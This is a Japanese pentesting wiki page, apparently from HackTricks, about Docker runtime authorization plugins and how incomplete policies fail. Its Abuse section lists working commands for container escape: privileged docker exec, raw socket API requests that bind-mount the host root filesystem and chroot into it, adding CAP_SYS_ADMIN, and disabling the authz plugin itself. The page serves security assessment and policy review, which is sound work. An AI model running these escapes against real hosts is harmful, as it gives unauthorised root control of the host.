# Runtime Authorization Plugins

## Overview

Runtime authorization pluginsは、callerが特定のdaemon actionを実行できるかどうかを決定する追加のpolicy layerです。Dockerが典型的な例です。デフォルトでは、Docker daemonと通信できるユーザーは、実質的に広範なcontrolを持ちます。Authorization pluginsは、認証済みユーザーと要求されたAPI operationを調査し、policyに従ってrequestを許可または拒否することで、このモデルを制限しようとします。

このtopicに専用ページが必要なのは、attackerがすでにDocker API、または`docker` groupのユーザーにaccessしている場合、exploitのモデルが変わるためです。そのような環境では、問題はもはや「daemonに到達できるか」だけではなく、「daemonはauthorization layerによってfenceされているか、またそうであれば、未処理のendpoint、弱いJSON parsing、またはplugin-management permissionsを通じてそのlayerをbypassできるか」です。

## Operation

requestがDocker daemonに到達すると、authorization subsystemはrequest contextを1つ以上のinstalled pluginsに渡せます。pluginは、認証済みユーザーのidentity、request details、選択されたheaders、さらにcontent typeが適切な場合はrequestまたはresponse bodyの一部を確認します。複数のpluginsをchainでき、すべてのpluginsがrequestをallowした場合にのみaccessが許可されます。

このmodelは強力に見えますが、安全性はpolicy authorがAPIをどれだけ完全に理解しているかに完全に依存します。`docker run --privileged`をblockする一方で`docker exec`を無視し、top-levelの`Binds`などのalternate JSON keysを見落とし、またはplugin administrationを許可するpluginは、直接的なprivilege-escalation pathsを残したまま、制限されているという誤った安心感を生む可能性があります。

## Common Plugin Targets

policy reviewで重要な領域は次のとおりです。

- container creation endpoints
- `HostConfig` fields such as `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, and namespace-sharing options
- `docker exec` behavior
- plugin management endpoints
- intended policy modelの範囲外でruntime actionsを間接的にtriggerできるendpoint

Historically、Twistlockの`authz` pluginや、`authobot`などのsimple educational pluginsによって、このmodelは容易にstudyできました。これは、それらのpolicy filesとcode pathsから、endpoint-to-action mappingが実際にどのように実装されているかを確認できたためです。assessment workで重要なlessonは、policy authorが最も目立つCLI commandsだけでなく、API surface全体を理解しなければならないということです。

## Abuse

最初の目標は、実際に何がblockされているかを把握することです。daemonがactionをdenyすると、errorにplugin nameがleakされることがあり、使用中のcontrolの特定に役立ちます。
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
より広範な endpoint profiling が必要な場合は、`docker_auth_profiler` などの tools が役立ちます。これらは、plugin によって実際に許可されている API routes と JSON structures を確認するという、 otherwise repetitive な作業を自動化します。

環境で custom plugin が使用されており、API とやり取りできる場合は、実際に filter される object fields を列挙します。
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
これらのチェックが重要なのは、多くの認可失敗が概念単位ではなく、フィールド単位で発生するためです。plugin は、同等の API 構造を完全にブロックせずに、CLI パターンを拒否する場合があります。

### 完全な例: `docker exec` によるコンテナ作成後の権限追加

privileged なコンテナの作成をブロックし、unconfined なコンテナの作成と `docker exec` を許可するポリシーは、依然として bypass される可能性があります。
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
デーモンが 2 番目のステップを受け入れると、ユーザーは、ポリシー作成者が制約されていると考えていたコンテナ内で、特権付きの対話型プロセスを復旧できます。

### 完全な例: Raw API を介した Bind Mount

脆弱なポリシーの中には、1 つの JSON 形式しか検査しないものがあります。root filesystem の bind mount が一貫してブロックされていない場合、ホストを引き続き mount できます。
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
同じ概念は `HostConfig` 配下にも現れる場合があります：
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
影響は、host のファイルシステム全体からの escape です。重要なのは、この bypass が kernel のバグではなく、policy の適用範囲が不完全であることに起因している点です。

### 完全な例: 未チェックの Capability Attribute

policy が capability に関連する attribute のフィルタリングを忘れると、attacker は危険な capability を再取得する container を作成できる可能性があります:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
`CAP_SYS_ADMIN` または同様に強力な capability が存在すると、[capabilities.md](protections/capabilities.md) および [privileged-containers.md](privileged-containers.md) で説明されている多くの breakout techniques が利用可能になります。

### 完全な例: Plugin の無効化

Plugin-management operations が許可されている場合、最もクリーンな bypass は control を完全に無効化することです:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
これは control-plane レベルでのポリシーの失敗です。authorization layer は存在しますが、制限対象であるはずのユーザーが、依然としてそれを無効化する権限を保持しています。

## チェック

これらのコマンドは、ポリシー層が存在するかどうか、またそれが完全なものか表面的なものにすぎないかを確認することを目的としています。
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
ここで興味深い点:

- plugin name を含む Denial message は authorization layer の存在を確認でき、多くの場合、正確な実装を明らかにします。
- attacker に表示される plugin list だけで、disable または reconfigure 操作が可能かどうかを発見できる場合があります。
- 明らかな CLI action だけを block し、raw API request を block しない policy は、反証されるまで bypass 可能なものとして扱うべきです。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | デフォルトでは有効化されていない | authorization plugin が設定されていない限り、Daemon access は実質的に all-or-nothing です | 不完全な plugin policy、allowlist ではなく blacklist を使用、plugin management の許可、field-level の blind spot |
| Podman | 一般的な直接の同等機能はない | Podman は通常、Docker-style authz plugin よりも Unix permissions、rootless execution、API exposure の判断に大きく依存します | rootful Podman API を広範囲に公開、弱い socket permissions |
| containerd / CRI-O | 異なる control model | これらの Runtime は通常、Docker authz plugin ではなく、socket permissions、node trust boundary、上位レイヤーの orchestrator control に依存します | workload への socket の mount、弱い node-local trust assumption |
| Kubernetes | Docker authz plugin ではなく、API-server および kubelet layer で authn/authz を使用 | Cluster RBAC と admission control が主な policy layer です | 過度に広範な RBAC、弱い admission policy、kubelet または Runtime API の直接公開 |

{{#include ../../../banners/hacktricks-training.md}}
